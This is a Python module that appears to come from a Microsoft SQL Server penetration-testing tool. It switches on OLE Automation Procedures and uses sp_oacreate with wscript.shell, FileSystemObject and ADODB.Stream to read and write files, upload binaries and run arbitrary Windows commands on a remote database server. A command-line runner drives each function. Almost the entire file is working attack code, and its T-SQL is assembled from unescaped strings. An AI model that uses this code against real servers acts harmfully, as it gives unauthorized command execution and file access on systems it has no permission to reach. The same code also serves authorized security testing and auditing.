#!/usr/bin/python
# -*- coding: utf-8 -*-

import logging
from Mssql import Mssql
from Utils import cleanString, ErrorClass, checkOptionsGivenByTheUser, putDataToFile, getBinaryDataFromFile
from Constants import *

class OleAutomation (Mssql):
	'''
	Use OLE automation in Transact-SQL to read/write file and execute system commands
	'''
	#CONSTANTES
	REQ_ENABLE_OLE_Automation_Procedures_1_ = "exec master.dbo.sp_configure 'show advanced options', 1"
	REQ_ENABLE_OLE_Automation_Procedures_2_ = "RECONFIGURE"
	REQ_ENABLE_OLE_Automation_Procedures_3_ = "exec master.dbo.sp_configure 'Ole Automation Procedures', 1"
	REQ_ENABLE_OLE_Automation_Procedures_4_ = "RECONFIGURE"
	REQ_DISABLE_OLE_Automation_Procedures_1_ = "exec master.dbo.sp_configure 'Ole Automation Procedures', 0"
	REQ_DISABLE_OLE_Automation_Procedures_2_ = "RECONFIGURE"
	REQ_DISABLE_OLE_Automation_Procedures_3_ = "exec master.dbo.sp_configure 'show advanced options', 0"
	REQ_DISABLE_OLE_Automation_Procedures_4_ = "RECONFIGURE"
	REQ_READ_FILE = """declare @o int, @f int, @t int, @ret int
						declare @line varchar(8000),@alllines varchar(8000)
						set @alllines =''
						exec sp_oacreate 'scripting.filesystemobject', @o out
						exec sp_oamethod @o, 'opentextfile', @f out, '{0}', 1
						exec @ret = sp_oamethod @f, 'readline', @line out
						while (@ret = 0)
						begin
						set @alllines = @alllines + @line + '\n'
						exec @ret = sp_oamethod @f, 'readline', @line out
						end
						select @alllines as lines""" #{0} filename
	REQ_WRITE_FILE = """declare @o int, @f int, @t int, @ret int
						exec sp_oacreate 'scripting.filesystemobject', @o out
						exec sp_oamethod @o, 'createtextfile', @f out, '{0}', 1
						exec @ret = sp_oamethod @f, 'writeline', NULL, '{1}'"""#{0} filename, {1}data
	REQ_EXEC_SYS_CMD = """DECLARE @shell INT
						EXEC sp_oacreate 'wscript.shell', @shell output
						EXEC sp_oamethod @shell, 'run', null, '{0}', '0','{1}'"""#{0} cmd, {1} wait
	REQ_WRITE_FILE_BINARY = """ DECLARE @Obj INT;
								EXEC sp_OACreate 'ADODB.Stream' ,@Obj OUTPUT;
								EXEC sp_OASetProperty @Obj ,'Type',1;
								EXEC sp_OAMethod @Obj,'Open';
								EXEC sp_OAMethod @Obj,'Write', NULL, {1};
								EXEC sp_OAMethod @Obj,'SaveToFile', NULL, '{0}', 2;
								EXEC sp_OAMethod @Obj,'Close';
								EXEC sp_OADestroy @Obj;"""#{0} filename, {1}data
	
	
	def __init__(self, args):
		'''
		Constructor
		'''
		Mssql.__init__(self, args=args)
		
	def enableOLEAutomationProcedures (self):
		'''
		to enable Ole Automation
		'''
		logging.info("Re-enabling the Ole Automation Procedures ...")
		data = self.executeRequest(self.REQ_ENABLE_OLE_Automation_Procedures_1_,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_ENABLE_OLE_Automation_Procedures_2_,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_ENABLE_OLE_Automation_Procedures_3_,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_ENABLE_OLE_Automation_Procedures_4_,noResult=True)
		if isinstance(data,Exception): return data
		logging.info("The Ole Automation Procedures is re-enabled")
		return True
		
	def disableOLEAutomationProcedures (self):
		'''
		to disable Ole Automation
		'''
		logging.info("Disabling  the Ole Automation Procedures ...")
		data = self.executeRequest(self.REQ_DISABLE_OLE_Automation_Procedures_1_,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_DISABLE_OLE_Automation_Procedures_2_,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_DISABLE_OLE_Automation_Procedures_3_,noResult=True)
		if isinstance(data,Exception): return data
		data = self.executeRequest(self.REQ_DISABLE_OLE_Automation_Procedures_4_,noResult=True)
		if isinstance(data,Exception): return data
		logging.info("The Ole Automation Procedures is disabled")
		return True
		
	def readFile (self, filename):
		'''
		to read file
		'''
		logging.info("Reading the {0} file via Ole Automation in T-SQL ...".format(filename))
		data = self.executeRequest(self.REQ_READ_FILE.format(filename),ld=['lines'])
		if isinstance(data,Exception):
			if ERROR_PROCEDURE_BLOCKED in str(data) :
				status = self.enableOLEAutomationProcedures()
				if isinstance(status,Exception):
					logging.info("I try to re-enable OLE automation but always impossible to read the file : {0}".format(status))
					return status
				else : return self.readFile(filename)
			else :
				logging.info("Impossible to read the file: {0}".format(data))
				return data
		logging.info("The {0} file has been read".format(filename))
		data = data[0]['lines']
		if data=="" : logging.info("The file is empty. Perhaps the file name {0} is incorrect.".format(filename))
		return data
		
	def writeFile (self, filename, data):
		'''
		To writre file
		If return True, file created, otherwise, return an error
		No simple quote in the data parameter
		'''
		logging.info("Writing the {0} file via Ole Automation in T-SQL ...".format(filename))
		data = self.executeRequest(self.REQ_WRITE_FILE.format(filename, data), noResult=True)
		if isinstance(data,Exception):
			if ERROR_PROCEDURE_BLOCKED in str(data) :
				status = self.enableOLEAutomationProcedures()
				if isinstance(status,Exception):
					logging.info("I try to re-enable OLE automation but always impossible to write the file : {0}".format(status))
					return status
				else : return self.readFile(filename)
			else :
				logging.info("Impossible to write the file: {0}".format(data))
				return data
		logging.info("The {0} file has been created".format(filename))
		return True
		
	def writeFileBinary (self, filename, data):
		'''
		To writre file
		If return True, file created, otherwise, return an error
		'''
		logging.info("Writing the {0} file via Ole Automation in T-SQL ...".format(filename))
		data = self.executeRequest(self.REQ_WRITE_FILE_BINARY.format(filename, data), noResult=True)
		if isinstance(data,Exception):
			if ERROR_PROCEDURE_BLOCKED in str(data) :
				status = self.enableOLEAutomationProcedures()
				if isinstance(status,Exception):
					logging.info("I try to re-enable OLE automation but always impossible to write the file : {0}".format(status))
					return status
				else : return self.readFile(filename)
			else :
				logging.info("Impossible to write the file: {0}".format(data))
				return data
		logging.info("The {0} file has been created".format(filename))
		return True
		
	def executeSysCmd (self, cmd, wait=True):
		'''
		Execute a system command
		Return True if ok, otherwise an error
		'''
		logging.info("Executing the '{0}' cmd via Ole Automation in T-SQL ...".format(cmd))
		data = self.executeRequest(self.REQ_EXEC_SYS_CMD.format(cmd, wait), noResult=False)
		if isinstance(data,Exception): 
			logging.info("Impossible to execute system command: {0}".format(data))
			return data
		logging.info("The system command '{0}' has been executed".format(cmd))
		return True
		
	'''
	def __put0x(self, rawData):
		"""
		put 0x before head byte and return hex string
		"""
		hexString = ""
		for aByte in rawData:
			hexString += "0x"+aByte.encode('hex')
		return hexString
	'''
		
			
	def putFile (self, localFile, remoteFile):
		'''
		Put the file localFile on the remote file remoteFile
		Return True if ok, otherwise an error
		'''
		logging.info("Copying the local file {0} to {1}".format(localFile, remoteFile))
		data = getBinaryDataFromFile(localFile)
		dataEncoded = "0x"+data.encode('hex')
		status = self.writeFileBinary(remoteFile, dataEncoded)
		if isinstance(status,Exception):
			logging.info("Impossible to create the remote file {0}".format(remoteFile))
			return status
		else:
			return True
		
	def getFile (self, remoteFile, localFile):
		'''
		Copy the remote file remoteFile into localFile
		Return True if no error. Otherwise, returns Exception
		'''
		logging.info ("Copy the remote file {0} to {1}".format(remoteFile,localFile))
		data = self.readFile (remoteFile)
		if isinstance(data,Exception): 
			return data
		else:
			putDataToFile(data, localFile)
			return True
		
	def testAll (self):
		'''
		Test all functions
		'''
		self.args['print'].subtitle("Can you use OLE Automation to read files ?")
		status = self.readFile(DEFAULT_FILENAME)
		if isinstance(status,Exception): 
			self.args['print'].badNews("KO")
		else :
			self.args['print'].goodNews("OK")
		self.args['print'].subtitle("Can you use OLE Automation to write files ?")
		status = self.writeFile(DEFAULT_FILENAME,'')
		if isinstance(status,Exception):
			self.args['print'].badNews("KO")
		else :
			self.args['print'].goodNews("OK")
		self.args['print'].subtitle("Can you use OLE Automation to execute Windows system commands ?")
		status = self.executeSysCmd(DEFAULT_SYS_CMD_OLE,wait=False)
		if status == True:
			self.args['print'].goodNews("OK")
		else:
			self.args['print'].badNews("KO")
		
		
def runOleAutomationModule(args):
	'''
	Run the runOleAutomation module
	'''
	if checkOptionsGivenByTheUser(args,["read-file","write-file","get-file","put-file","exec-sys-cmd","enable-ole-automation","disable-ole-automation"],checkAccount=True) == False : return EXIT_MISS_ARGUMENT
	oleAutomation = OleAutomation(args)
	oleAutomation.connect()
	if args["test-module"] == True: oleAutomation.testAll()
	if args["enable-ole-automation"] ==True:
		args['print'].title("Try to enable OLE Automation")
		status = oleAutomation.enableOLEAutomationProcedures()
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to enable OLE Automation: '{0}'".format(status))
		else:
			args['print'].goodNews("OLE Automation is enabled")
	if args["read-file"] != None:
		args['print'].title("Try to read the remote file {0}".format(args['read-file'][0]))
		data = oleAutomation.readFile(args['read-file'][0])
		if isinstance(data,Exception): 
			args['print'].badNews("The file can't be read: '{0}'".format(data))
		else:
			args['print'].goodNews("Data in the file {0}:\n{1}".format(args['read-file'][0],data))
	if args["write-file"] != None:
		args['print'].title("Try to write this data on the remote file {0}: '{1}'".format(args['write-file'][0],args['write-file'][1]))
		data = oleAutomation.writeFile(args['write-file'][0],args['write-file'][1])
		if isinstance(data,Exception):
			args['print'].badNews("Data cannot be written: '{0}'".format(data))
		else:
			args['print'].goodNews("Data has been written in the file {0}".format(args['write-file'][0]))
	if args["get-file"] != None:
		args['print'].title("Try to copy the remote file {0} to {1}".format(args['get-file'][0],args['get-file'][1]))
		data = oleAutomation.getFile(args['get-file'][0],args['get-file'][1])
		if data == True:
			args['print'].goodNews("The remote file {0} has been copied in {1}".format(args['get-file'][0],args['get-file'][1]))
		else:
			args['print'].badNews("Impossible to get the remote file {0}: '{1}'".format(args['get-file'][0],data))
	if args["put-file"] != None:
		args['print'].title("Try to copy the local file {0} to {1}".format(args['put-file'][0],args['put-file'][1]))
		data = oleAutomation.putFile(args['put-file'][0],args['put-file'][1])
		if data == True:
			args['print'].goodNews("The local file {0} has been copied in {1}".format(args['put-file'][0],args['put-file'][1]))
		else:
			args['print'].badNews("Impossible to put the local file {0} to {1}: '{2}'".format(args['put-file'][0],args['put-file'][1],data))
	if args["exec-sys-cmd"] != None:
		args['print'].title("Try to execute a Windows system command: '{0}'".format(args['exec-sys-cmd'][0]))
		status = oleAutomation.executeSysCmd(args['exec-sys-cmd'][0],wait=True)
		if status == True:
			args['print'].goodNews("The system command has been executed on the remote server")
		else:
			args['print'].badNews("Impossible to execute the Windows system command: {0}".format(status))
	if args["disable-ole-automation"] ==True:
		args['print'].title("Try to disable OLE Automation")
		status = oleAutomation.disableOLEAutomationProcedures()
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to disable OLE Automation: '{0}'".format(status))
		else:
			args['print'].goodNews("OLE Automation is disabled")
	oleAutomation.closeConnection()
